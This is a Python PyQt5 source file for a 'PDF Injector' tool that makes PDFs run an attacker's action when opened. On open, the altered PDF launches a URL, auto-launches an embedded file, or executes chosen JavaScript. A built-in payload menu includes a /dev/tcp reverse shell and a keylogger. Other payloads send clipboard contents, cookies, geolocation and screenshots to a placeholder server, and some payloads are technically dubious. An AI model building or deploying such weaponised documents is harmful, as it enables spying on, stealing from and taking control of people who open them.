
import sys
import os
import PyPDF4
from PyPDF4.generic import (
    DictionaryObject,
    NameObject,
    TextStringObject,
    EncodedStreamObject,
    ArrayObject,
    
)


from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QRadioButton,
    QFileDialog,
    QWidget,
    QPlainTextEdit,
    QButtonGroup,
    QMessageBox,
    QGroupBox,
    QInputDialog,
    
    
)
from PyQt5.QtCore import Qt


js_payloads = {
    "Alert Box": "app.alert('This is an alert box.');",
    "Denial of Service (DoS)": "while (true) { app.alert('DoS attack!'); }",
    "Print Dialog": "this.print();",
    "Open Website": "app.launchURL('https://example.com', true);",
    "Download File": "app.launchURL('https://example.com/secret_document.pdf', true);",
    "Remote Code Execution (RCE)": "var cmd = 'uname -a'; var result = util.printd(exec(cmd)); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/cmd'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ output: result }));",
    "Reverse Shell": "var cmd = '/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\''; var result = util.printd(exec(cmd)); console.log(result);",
    "Remote Access": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { console.log(xhr.responseText); } }; xhr.open('GET', 'https://your-website.com/command?cmd=ls', true); xhr.send(null);",
    "Keylogger": "var keystrokes = ''; setInterval(function() { if (keystrokes.length > 0) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/keystrokes'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ keystrokes: keystrokes })); keystrokes = ''; } }, 10000); this.onKeyDown = function() { keystrokes += event.key; };",
    "Execute Remote JavaScript": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { eval(xhr.responseText); } }; xhr.open('GET', 'https://example.com/remote_script.js', true); xhr.send(null);",
    "Clipboard Data Exfiltration": "navigator.clipboard.readText().then(function(clipboardText) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/clipboard'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ clipboard: clipboardText })); });",
    "Webcam Access": "navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) { var video = document.createElement('video'); video.srcObject = stream; video.play(); });",
    "Screen Capture": "navigator.mediaDevices.getDisplayMedia({ video: true }).then(function(stream) { var video = document.createElement('video'); video.srcObject = stream; video.play(); setTimeout(function() { var canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; var ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/screen_capture'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ screenshot: canvas.toDataURL() })); }, 5000); });",
    "Get Geolocation": "if ('geolocation' in navigator) { navigator.geolocation.getCurrentPosition(function(position) { var geolocation = { latitude: position.coords.latitude, longitude: position.coords.longitude }; var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/geolocation'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ geolocation: geolocation })); }); }",
    "List Stored Cookies": "var cookies = document.cookie.split('; ').reduce(function(cookieObj, cookieString) { var keyValue = cookieString.split('='); cookieObj[keyValue[0]] = keyValue[1]; return cookieObj; }, {}); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/cookies'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ cookies: cookies }));", 
    "List Stored Credentials": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var credentials = xhr.responseText.split('\\n'); for (var i = 0; i < credentials.length; i++) { if (credentials[i]) { console.log('Credential ' + (i + 1) + ': ' + credentials[i]); } } } }; xhr.open('GET', 'https://your-website.com/credentials', true); xhr.send(null);",
    "Get Stored Credentials": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var credentials = xhr.responseText.split('\\n'); for (var i = 0; i < credentials.length; i++) { if (credentials[i]) { console.log('Credential ' + (i + 1) + ': ' + credentials[i]); } } } }; xhr.open('GET', 'https://your-website.com/credentials', true); xhr.send(null);",
    "Get Browser History": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var history = xhr.responseText.split('\\n'); for (var i = 0; i < history.length; i++) { if (history[i]) { console.log('History ' + (i + 1) + ': ' + history[i]); } } } }; xhr.open('GET', 'https://your-website.com/history', true); xhr.send(null);",
    "Get Wifi Passwords": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var wifi_passwords = xhr.responseText.split('\\n'); for (var i = 0; i < wifi_passwords.length; i++) { if (wifi_passwords[i]) { console.log('Wifi Password ' + (i + 1) + ': ' + wifi_passwords[i]); } } } }; xhr.open('GET', 'https://your-website.com/wifi_passwords', true); xhr.send(null);",
    "Play Sound": "var sound = new Sound(); sound.src = 'https://example.com/sound.mp3'; sound.play();",

}

def inject_url(input_pdf, output_pdf, malicious_url):
    # Read the input PDF
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        # Set OpenAction to launch the malicious URL when the PDF is opened
        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/URI"),
            NameObject("/URI"): TextStringObject(malicious_url)
        })

        # Add all pages to the output PDF
        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        # Add OpenAction to the PDF's root dictionary (catalog)
        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})

        # Write the output PDF
        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)
            
def inject_file(input_pdf, output_pdf, file_to_inject):
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        # Add all pages to the output PDF
        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        # Read the file to be injected
        with open(file_to_inject, "rb") as file_inject:
            file_data = file_inject.read()

        # Create an embedded file with the file data
        ef_stream = EncodedStreamObject()
        ef_stream._data = file_data
        ef_stream.update({
            NameObject("/Type"): NameObject("/EmbeddedFile"),
            NameObject("/Filter"): NameObject("/ASCIIHexDecode")
        })

        # Add the embedded file to the PDF
        file_name = TextStringObject(file_to_inject.split("/")[-1])
        embedded_file = pdf_writer._addObject(ef_stream)
        filespec = DictionaryObject({
            NameObject("/Type"): NameObject("/Filespec"),
            NameObject("/F"): file_name,
            NameObject("/EF"): DictionaryObject({
                NameObject("/F"): embedded_file
            })
        })
        filespec_obj = pdf_writer._addObject(filespec)

        # Add JavaScript to launch the embedded file
        js_code = f"""
        var filePath = this.path.replace(/[^\\/]+$/, '');
        var fileName = '{file_name}';
        var fileSpec = this.getDoc({{ cPath: fileName }});
        this.exportDataObject({{ cName: fileName, nLaunch: 2 }});
        app.launchURL('file:///' + filePath + fileName, true);
        """       

        js_text_string = TextStringObject(js_code)

        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): js_text_string
        })

        # Add OpenAction to the PDF's root dictionary (catalog)
        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})  
        

        # Update the PDF's root dictionary (catalog) to include the embedded file
        if "/Names" not in pdf_writer._root_object:
            pdf_writer._root_object.update({
                NameObject("/Names"): DictionaryObject()
            })

        if "/EmbeddedFiles" not in pdf_writer._root_object["/Names"]:
            pdf_writer._root_object["/Names"].update({
                NameObject("/EmbeddedFiles"): DictionaryObject({
                    NameObject("/Names"): ArrayObject()
                })
            })

        pdf_writer._root_object["/Names"]["/EmbeddedFiles"]["/Names"].extend([file_name, filespec_obj])

        # Write the output PDF
        with open(output_pdf, "wb") as output_file:
           pdf_writer.write(output_file)

def inject_js(input_pdf, output_pdf, js_code):
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        # Add all pages to the output PDF
        for i in range(pdf_reader.getNumPages()):
            pdf_writer.addPage(pdf_reader.getPage(i))

        # Set OpenAction to execute JavaScript when the PDF is opened
        js_text_string = TextStringObject(js_code)

        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): js_text_string
        })

        # Add OpenAction to the PDF's root dictionary (catalog)
        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})

        # Write the output PDF
        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

 

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("PDF Injector")
    
        self.show()

        # Create the layout and widgets
        main_layout = QVBoxLayout()
        form_widget = QWidget()
        form_widget.setLayout(main_layout)
        self.setCentralWidget(form_widget)
        
        js_payload_button = QPushButton("Add Payload")
        js_payload_button.clicked.connect(self.add_js_payload)

        input_layout = QHBoxLayout()
        input_label = QLabel("Input PDF:")
        self.input_line_edit = QLineEdit()
        input_browse_button = QPushButton("Browse")
        input_browse_button.clicked.connect(self.browse_input)
        input_layout.addWidget(input_label)
        input_layout.addWidget(self.input_line_edit)
        input_layout.addWidget(input_browse_button)

        output_layout = QHBoxLayout()
        output_label = QLabel("Output PDF:")
        self.output_line_edit = QLineEdit()
        output_browse_button = QPushButton("Browse")
        output_browse_button.clicked.connect(self.browse_output)
        output_layout.addWidget(output_label)
        output_layout.addWidget(self.output_line_edit)
        output_layout.addWidget(output_browse_button)

        radio_group_box = QGroupBox("Injection Method")
        radio_layout = QHBoxLayout()   
        radio_group_box.setLayout(radio_layout)
        self.url_radio_button = QRadioButton("Inject URL")
        self.file_radio_button = QRadioButton("Inject File")
        self.js_radio_button = QRadioButton("Inject JavaScript")
        radio_layout.addWidget(self.url_radio_button)
        radio_layout.addWidget(self.file_radio_button)
        radio_layout.addWidget(self.js_radio_button)
        
        
        


        url_layout = QHBoxLayout()
        url_label = QLabel("URL:")
        self.url_line_edit = QLineEdit()
        self.url_line_edit.setPlaceholderText("Malicious URL")
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_line_edit)

        file_layout = QHBoxLayout()
        file_label = QLabel("File:")
        self.file_line_edit = QLineEdit()
        self.file_line_edit.setPlaceholderText("File to be injected") 
        file_browse_button = QPushButton("Browse")
        file_browse_button.clicked.connect(self.browse_file)
        file_layout.addWidget(file_label)
        file_layout.addWidget(self.file_line_edit)
        file_layout.addWidget(file_browse_button)

        js_label = QLabel("JavaScript Code:")

        self.js_plain_text_edit = QPlainTextEdit()
        self.js_plain_text_edit.setPlaceholderText("JavaScript code or .js file path")

        inject_button = QPushButton("Inject")
        inject_button.clicked.connect(self.inject)

        # Add the layouts to the main layout
        main_layout.addLayout(input_layout)
        main_layout.addLayout(output_layout)
        main_layout.addWidget(radio_group_box)
        main_layout.addLayout(url_layout)
        main_layout.addLayout(file_layout)
        main_layout.addWidget(js_label)
        main_layout.addWidget(self.js_plain_text_edit)
        main_layout.addWidget(inject_button)
        main_layout.addWidget(js_payload_button)
        
    def inject(self):
        input_pdf = self.input_line_edit.text()
        output_pdf = self.output_line_edit.text()

        if not self.input_line_edit.text():
            msg_box = QMessageBox()
            msg_box.setIcon(QMessageBox.Critical)
            msg_box.setWindowTitle("PDF Injector")
            msg_box.setText("Error: No input file selected")
            msg_box.setStandardButtons(QMessageBox.Ok)
            msg_box.exec_()
            return

        if not self.output_line_edit.text():
            msg_box = QMessageBox()
            msg_box.setIcon(QMessageBox.Critical)
            msg_box.setWindowTitle("PDF Injector")
            msg_box.setText("Error: No output file selected")
            msg_box.setStandardButtons(QMessageBox.Ok)
            msg_box.exec_()
            return

        if not self.url_radio_button.isChecked() and not self.file_radio_button.isChecked() and not self.js_radio_button.isChecked():
            msg_box = QMessageBox()
            msg_box.setIcon(QMessageBox.Critical)
            msg_box.setWindowTitle("PDF Injector")
            msg_box.setText("Error: No injection method selected")
            msg_box.setStandardButtons(QMessageBox.Ok)
            msg_box.exec_()
            return

        if self.url_radio_button.isChecked():
            malicious_url = self.url_line_edit.text()
            if not malicious_url:
                msg_box = QMessageBox()
                msg_box.setIcon(QMessageBox.Critical)
                msg_box.setWindowTitle("PDF Injector")
                msg_box.setText("Error: Malicious URL cannot be empty")
                msg_box.setStandardButtons(QMessageBox.Ok)
                msg_box.exec_()
                return
            inject_url(input_pdf, output_pdf, malicious_url)
        elif self.file_radio_button.isChecked():
            file_to_inject = self.file_line_edit.text()
            if not file_to_inject:
                msg_box = QMessageBox()
                msg_box.setIcon(QMessageBox.Critical)
                msg_box.setWindowTitle("PDF Injector")
                msg_box.setText("Error: File to inject cannot be empty")
                msg_box.setStandardButtons(QMessageBox.Ok)
                msg_box.exec_()
                return
            inject_file(input_pdf, output_pdf, file_to_inject)
        elif self.js_radio_button.isChecked():
            js_code = self.js_plain_text_edit.toPlainText()
            if not js_code:
                msg_box = QMessageBox()
                msg_box.setIcon(QMessageBox.Critical)
                msg_box.setWindowTitle("PDF Injector")
                msg_box.setText("Error: JavaScript code cannot be empty")
                msg_box.setStandardButtons(QMessageBox.Ok)
                msg_box.exec_()
                return
            if js_code.endswith('.js'):
                with open(js_code, 'r') as js_file:
                    js_code = js_file.read()
            inject_js(input_pdf, output_pdf, js_code)
        else:
            raise ValueError("No URL, file, or JavaScript code specified for injection")

        try:
            if self.url_radio_button.isChecked():
                malicious_url = self.url_line_edit.text()
                inject_url(input_pdf, output_pdf, malicious_url)
            elif self.file_radio_button.isChecked():
                file_to_inject = self.file_line_edit.text()
                inject_file(input_pdf, output_pdf, file_to_inject)
            elif self.js_radio_button.isChecked():
                js_code = self.js_plain_text_edit.toPlainText()
                if js_code.endswith('.js'):
                    with open(js_code, 'r') as js_file:
                        js_code = js_file.read()
                inject_js(input_pdf, output_pdf, js_code)
            else:
                raise ValueError("No URL, file, or JavaScript code specified for injection")

            # Show a message box when the injection is successful
            msg_box = QMessageBox()
            msg_box.setIcon(QMessageBox.Information)
            msg_box.setWindowTitle("PDF Injector")
            msg_box.setText("Injection successful")
            msg_box.setStandardButtons(QMessageBox.Ok)
            msg_box.exec_()

        except Exception as e:
            msg_box = QMessageBox()
            msg_box.setIcon(QMessageBox.Critical)
            msg_box.setWindowTitle("PDF Injector")
            msg_box.setText("Error: Injection failed")
            msg_box.setDetailedText(str(e))
            msg_box.setStandardButtons(QMessageBox.Ok)
            msg_box.exec_()
            



    def browse_input(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Open Input PDF", "", "PDF Files (*.pdf)")
        self.input_line_edit.setText(file_name)
    
    def browse_output(self):
        file_name, _ = QFileDialog.getSaveFileName(self, "Save Output PDF", "", "PDF Files (*.pdf)")
        self.output_line_edit.setText(file_name)

    def browse_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Select File to Inject", "")
        self.file_line_edit.setText(file_name)

    def add_js_payload(self):
        payload_list = sorted(js_payloads.keys())
        payload, ok = QInputDialog.getItem(self, "Select JavaScript Payload", "Choose a JavaScript payload:", payload_list, 0, False)
        if ok and payload:
            self.js_plain_text_edit.setPlainText(js_payloads[payload])

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())
 